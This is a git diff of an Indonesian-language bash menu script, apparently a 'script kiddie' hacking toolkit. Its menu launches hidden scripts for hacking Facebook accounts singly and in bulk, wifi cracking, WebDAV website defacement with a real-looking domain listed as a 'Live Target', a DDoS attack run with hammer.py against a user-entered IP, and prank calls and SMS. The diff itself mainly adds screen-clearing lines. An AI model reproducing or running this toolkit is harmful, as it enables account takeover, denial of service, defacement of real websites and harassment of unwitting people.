@@ -18,6 +18,7 @@ echo -e $cyan "            *-0-0-***-0-0-***-0-0-*   "
 ###################################################
 # CTRL + C
 ###################################################
+
 trap ctrl_c INT
 ctrl_c() {
 clear
@@ -40,44 +41,38 @@ read -p "FBH ==>" pil;
 
 case $pil in
 help)
+clear
 echo""
 echo -e $red "   *Commmend*          *Info*"
 echo ""
 echo ""
 echo -e $cyan "     FBH_t           =$purple""Hack FB target"
-echo -e $red "+++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e $cyan "     FBH_r           =$purple""Hack FB rombongan"
-echo -e $red "+++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e $cyan "     FBH_w           =$purple""Hack wifi (Root)"
-echo -e $red "+++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e $cyan "     FBH_n           =$purple""Scan Web"
-echo -e $red "+++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e $cyan "     FBH_d           =$purple""Deface webdav"
-echo -e $red "+++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e $cyan "     FBH_o           =$purple""DDOS Attack (hammer)"
-echo -e $red "+++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e $cyan "     FBH_p           =$purple""Prank Telpon"
-echo -e $red "+++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e $cyan "     FBH_m           =$purple""Prank SMS"
-echo -e $red "+++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e $cyan "     FBH_s           =$purple""Buat Script Deface"
-echo -e $red "+++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e $cyan "     exit            =$purple""Keluar dari Program"
-echo -e $red "+++++++++++++++++++++++++++++++++++++++++++++++++++"
 
 ;;
 
 FBH_t)
+clear
 python .FBHtarget.py
 
 ;;
 
 FBH_r)
+clear
 python2 .FBHrombongan.py
 
 ;;
 
 FBH_n)
+clear
 echo -e $cyan "Masukan Web Target:"
 read web
 nmap -v -A $web
@@ -85,6 +80,7 @@ nmap -v -A $web
 ;;
 
 FBH_d)
+clear
 echo -e $blue "++++++++++++++Live Target++++++++++++++++++ "
 echo -e $red "####################################"
 echo -e $cyan " ® bitsandpieces.co.za"
@@ -122,11 +118,13 @@ sleep 5
 ;;
 
 FBH_w)
+clear
 python2 .wifite.py
 
 ;;
 
 FBH_o)
+clear
 echo -e $cyan "Masukan IP Target:"
 read ip
 python3 .hammer.py -s $ip -p 80 -t 135
@@ -134,16 +132,19 @@ python3 .hammer.py -s $ip -p 80 -t 135
 ;;
 
 FBH_p)
+clear
 php .call.php
 
 ;;
 
 FBH_w)
+clear
 php .wa.php
 
 ;;
 
 FBH_s)
+clear
 python2 .create.py
 
 ;;
